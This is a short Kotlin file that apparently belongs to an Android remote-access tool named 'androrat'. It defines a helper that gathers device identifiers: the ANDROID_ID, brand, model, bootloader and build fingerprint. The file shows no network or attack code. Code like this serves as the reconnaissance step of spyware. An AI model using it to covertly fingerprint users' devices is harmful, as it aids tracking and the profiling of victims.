package com.ierusalem.androrat.core.utils

import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import android.provider.Settings

@SuppressLint("HardwareIds")
fun Context.getSystemDetails():String {
    return "Brand: ${Build.BRAND} \n" +
            "DeviceID: ${
                Settings.Secure.getString(
                    this.contentResolver,
                    Settings.Secure.ANDROID_ID
                )
            } \n" +
            "Model: ${Build.MODEL} \n" +
            "ID: ${Build.ID} \n" +
            "SDK: ${Build.VERSION.SDK_INT} \n" +
            "Manufacture: ${Build.MANUFACTURER} \n" +
            "Hardware: ${Build.HARDWARE} \n" +
            "Bootloader: ${Build.BOOTLOADER} \n" +
            "User: ${Build.USER} \n" +
            "Type: ${Build.TYPE} \n" +
            "Base: ${Build.VERSION_CODES.BASE} \n" +
            "Incremental: ${Build.VERSION.INCREMENTAL} \n" +
            "Board: ${Build.BOARD} \n" +
            "Host: ${Build.HOST} \n" +
            "FingerPrint: ${Build.FINGERPRINT} \n" +
            "Version Code: ${Build.VERSION.RELEASE}"
}